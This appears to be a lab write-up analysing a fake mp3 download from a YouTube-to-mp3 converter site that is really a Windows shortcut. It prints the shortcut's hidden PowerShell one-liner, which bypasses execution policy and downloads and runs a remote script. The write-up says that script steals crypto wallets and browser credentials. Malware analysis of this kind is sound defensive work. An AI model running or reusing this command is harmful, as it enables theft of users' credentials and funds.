**Youtube to mp3 converter websites**

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **Phishing scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.

![youtube converter website](https://github.com/user-attachments/assets/c8d4b379-b361-4201-ba13-5f7494f0e9d1)

Anything that says super secured, don’t trust it 😀

![screenshot2](https://github.com/user-attachments/assets/9ef88c08-65ba-4a4b-9f6d-4db0fbbaf3e3)


1. Converted a youtube url and downloaded it
2. Came in a download.zip (which shouldn’t be the case if it’s just downloading a mp3 file)
3. Extracted 2 mp3 files (somg.mp3 and song.mp3) 

1. Determine file contents `file <file name>`

![screenshot3](https://github.com/user-attachments/assets/555f146d-5ece-4c0e-a75d-358c1ea0685a)
    
song.mp3 output seems normal

somg.mp3 output seems to have a MS Windows shortcut (.lnk) file.

1. Inspect somg.mp3 file `exiftool <file name>`
    
![screenshot4_1](https://github.com/user-attachments/assets/553584bf-ac63-4838-b254-60fcba0357f3)


```jsx
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('[https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\\ProgramData\\s.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:%5C%5CProgramData%5C%5Cs.ps1)'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

`-ep Bypass -nop` flags disable PowerShells’s usual restrictions, allowing scripts to run without interference from security settings or user profiles

`DownloadFile` method pulls a file (`IS.ps1` ) from a remote server in github and saves to `C:\\ProgramData\\` directory on the target machine

Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.

![code_1](https://github.com/user-attachments/assets/a5c6cc90-9998-4494-8879-a26c3a2f3f37)


This script is designed to collect highly sensitive information from the victim’s system, such as cryptocurrency wallets and saved browswer credentials and send it to an attacker’s remote server

1. A giveaway “Created by the one and only M.M.” which potentially reveals identity
    
![github](https://github.com/user-attachments/assets/4d563b64-db17-4b1a-986c-bdefcf0c8cb5)

![identity](https://github.com/user-attachments/assets/9473dddf-095c-4520-b331-5cc7e04fe509)
  

A check on github reveals the name and location
